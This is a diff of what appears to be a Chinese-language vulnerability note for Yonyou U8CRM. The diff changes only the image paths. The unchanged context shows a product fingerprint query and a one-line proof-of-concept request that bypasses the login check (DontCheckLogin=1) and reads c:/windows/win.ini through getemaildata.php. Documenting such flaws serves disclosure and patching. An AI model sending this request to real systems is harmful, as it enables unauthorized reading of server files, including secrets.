@@ -18,7 +18,7 @@ web.body="用友U8CRM"
 
 登陆页面
 
-![image-20230828150939621](images/image-20230828150939621.png)
+![image-20230828150939621](../.gitbook/assets/image-20230828150939621.png)
 
 验证POC
 
@@ -26,4 +26,4 @@ web.body="用友U8CRM"
 /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
 ```
 
-![image-20230828150951560](images/image-20230828150951560.png)
+![image-20230828150951560](../.gitbook/assets/image-20230828150951560.png)
